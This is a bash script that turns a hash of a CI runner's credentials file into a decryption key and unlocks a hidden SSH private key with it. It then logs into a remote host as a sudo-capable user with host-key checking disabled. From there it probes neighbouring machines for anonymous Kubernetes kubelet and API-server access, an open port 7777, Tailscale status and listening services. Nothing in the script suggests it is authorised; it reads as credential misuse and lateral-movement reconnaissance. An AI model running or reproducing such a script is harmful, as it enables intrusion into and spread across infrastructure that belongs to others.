#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null
chmod 600 /root/.k221
head -1 /root/.k221
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
echo "== id/sudo:"
id; sudo -n id 2>&1 | head -2
echo "== neighbors:"
ip neigh | grep 85.234.79 | head -12
echo "== kubelet anon:"
for o in 31 87 103 109 184 233; do
  code=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" https://85.234.79.$o:10250/pods)
  echo "85.234.79.$o:10250/pods -> $code"
done
echo "== apiserver anon:"
for o in 31 87 103 109 184 233; do
  code=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" https://85.234.79.$o:6443/version)
  echo "85.234.79.$o:6443 -> $code"
done
echo "== 7777 clusterd:"
for o in 31 87 103 109 184 233; do
  timeout 3 bash -c "echo > /dev/tcp/85.234.79.$o/7777" 2>/dev/null && echo "85.234.79.$o:7777 OPEN" || echo "85.234.79.$o:7777 closed"
done
echo "== tailscale:"
which tailscale 2>/dev/null; tailscale status 2>&1 | head -5
echo "== sshd/ports listening:"
ss -tlnp 2>/dev/null | head -20
' 2>&1 | head -60
echo "== t-done =="
